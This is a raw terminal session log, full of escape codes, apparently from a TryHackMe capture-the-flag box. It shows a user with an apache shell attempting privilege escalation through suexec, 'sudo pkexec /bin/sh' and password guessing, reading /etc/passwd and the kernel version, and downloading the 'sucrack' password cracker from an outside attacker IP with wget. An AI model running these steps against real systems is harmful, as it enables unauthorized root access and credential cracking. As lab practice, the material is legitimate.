+[Kapache@tryhackme:/home/ubuntu$ [Kapache@tryhackme:/home/ubuntu$ [K[?2004hapache@tryhackme:/home/ubuntu$ [7m/usr/local/apache/bin/suexec[27m/usr/local/apache/bin/suexec cat /hpme[K[K[K[K[K[K[K[K[Klsl /home/ubuntu/.ssh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h/usr/local/apache/bin/suexec lsl /home/ubuntu/.ssh
+[K< /usr/local/apache/bin/suexec lsl /home/ubuntu/.ssh
+[Ksuexec policy violation: see suexec log for more details
+apache@tryhackme:/home/ubuntu$ [Kapache@tryhackme:/home/ubuntu$ [Kbin/sh[?2004hapache@tryhackme:/home/ubuntu$ [7msudo pkexec /bin/sh[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo pkexec /bin/sh
+[Ksudo pkexec /bin/sh
+[K[sudo] password for apache: [K[sudo] password for apache: [K[?2004h[sudo] password for apache: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[KSorry, try again.
+[K[sudo] password for apache: [K[sudo] password for apache: [K[?2004h[sudo] password for apache: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[KSorry, try again.[KSorry, try again.[KSorry, try again.
+[sudo] password for apache: [K[sudo] password for apache: [K[?2004h[sudo] password for apache: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[Ksudo: 3 incorrect password attempts
+[Kapache@tryhackme:/home/ubuntu$ [Kapache@tryhackme:/home/ubuntu$ [K[?2004hapache@tryhackme:/home/ubuntu$ [7m/snap/core18/2284/usr/bin/sudo[27m/snap/core18/2284/usr/bin/sudo ls /home/ubunutu[K[K[Ktyu[K[Ku/.ssh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h/snap/core18/2284/usr/bin/sudo ls /home/ubuntu/.ssh
+[K</snap/core18/2284/usr/bin/sudo ls /home/ubuntu/.ssh
+[K[sudo] password for apache: [K[sudo] password for apache: [K[?2004h[sudo] password for apache: apache[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hapache
+[K
+[K[sudo] password for apache: [K[sudo] password for apache: [K[?2004h[sudo] password for apache: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[K[sudo] password for apache: [K[sudo] password for apache: [K[?2004h[sudo] password for apache: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[Ksudo: 3 incorrect password attempts
+[Kapache@tryhackme:/home/ubuntu$ [Kapache@tryhackme:/home/ubuntu$ [K[?2004hapache@tryhackme:/home/ubuntu$ cat /etcpasswd[K[K[K[K[K[K/[a[K[Kpasswd[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat /etc/passwd
+[Kcat /etc/passwd
+[Kroot:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+lightdm:x:114:121:Light Display Manager:/var/lib/lightdm:/bin/false
+whoopsie:x:115:123::/nonexistent:/bin/false
+dnsmasq:x:116:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+avahi-autoipd:x:117:124:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+usbmux:x:118:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:119:125:RealtimeKit,,,:/proc:/usr/sbin/nologin
+avahi:x:120:126:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+cups-pk-helper:x:121:127:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+geoclue:x:122:128::/var/lib/geoclue:/usr/sbin/nolog[Kgeoclue:x:122:128::/var/lib/geoclue:/usr/sbin/nolog[Kgeoclue:x:122:128::/var/lib/geoclue:/usr/sbin/nologin
+pulse:x:123:130:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+speech-dispatcher:x:124:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+saned:x:125:132::/var/lib/saned:/usr/sbin/nologin
+nm-openvpn:x:126:133:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+colord:x:127:134:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+hplip:x:128:7:HPLIP system user,,,:/run/hplip:/bin/false
+gdm:x:129:135:Gnome Display Manager:/var/lib/gdm3:/bin/false
+fwupd-refresh:x:130:136:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+apache:x:1001:1001::/home/apache:/sbin/nologin
+mysql:x:1002:1002::/home/mysql:/sbin/nologin
+apache@tryhackme:/home/ubuntu$ [Kapache@tryhackme:/home/ubuntu$ [K[?2004hapache@tryhackme:/home/ubuntu$ uname -a[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004huname -a
+[Kuname -a
+[KLinux tryhackme 5.15.0-1056-aws #61~20.04.1-Ubuntu SMP Wed Mar 13 17:40:41 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+apache@tryhackme:/home/ubuntu$ [Kapache@tryhackme:/home/ubuntu$ [K[?2004hapache@tryhackme:/home/ubuntu$ cd /tmp[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /tmp
+[Kcd /tmp
+[Kapache@tryhackme:/tmp$ [Kapache@tryhackme:/tmp$ [K[?2004hapache@tryhackme:/tmp$ wget [K[K[K[K[Kwhich wget[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhich wget
+[Kwhich wget
+[K/usr/bin/wget
+apache@tryhackme:/tmp$ [Kapache@tryhackme:/tmp$ [K[?2004hapache@tryhackme:/tmp$ wget http://10.8.61.245/sucrack[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwget http://10.8.61.245/sucrack
+[K[?2004l
+Script done on 2025-03-20 02:42:36+03:00 [COMMAND_EXIT_CODE="0"]
